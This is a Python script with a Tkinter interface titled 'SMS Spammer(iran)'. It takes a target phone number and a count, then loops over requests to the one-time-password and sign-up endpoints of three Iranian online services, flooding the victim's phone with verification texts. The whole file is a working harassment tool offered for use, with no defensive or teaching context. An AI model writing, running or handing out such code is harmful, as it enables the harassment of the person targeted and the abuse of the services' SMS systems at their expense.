import requests
import tkinter as tk

def spam():
    try:
        phone = phone_entry.get()
        count = count_entry.get()
        data = {"cellphone": phone}
        
        for n in range(int(count)):
            print("SMS send")
            requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + phone)
            requests.get("https://core.gap.im/v1/user/add.json?mobile=" + phone)
            requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data)
    
    except Exception as e:
        print(f"ERROR: {e}")

def start():
    spam()

# Create GUI
root = tk.Tk()
root.title("SMS Spammer")
root.configure(bg="#E0F0F2")

title_label = tk.Label(root, text="Welcome to SMS Spammer(iran)", font=("Helvetica", 16, "bold"), bg="#E0F0F2", fg="#003566")
title_label.pack(pady=20)

phone_label = tk.Label(root, text="Enter target phone number:(with out zero)", font=("Helvetica", 12), bg="#E0F0F2", fg="#003566")
phone_label.pack()

phone_entry = tk.Entry(root, font=("Helvetica", 12))
phone_entry.pack()

count_label = tk.Label(root, text="Enter spam count:", font=("Helvetica", 12), bg="#E0F0F2", fg="#003566")
count_label.pack()

count_entry = tk.Entry(root, font=("Helvetica", 12))
count_entry.pack()

start_button = tk.Button(root, text="Start", font=("Helvetica", 12, "bold"), bg="#003566", fg="#E0F0F2", command=start)
start_button.pack(pady=20)

root.mainloop()

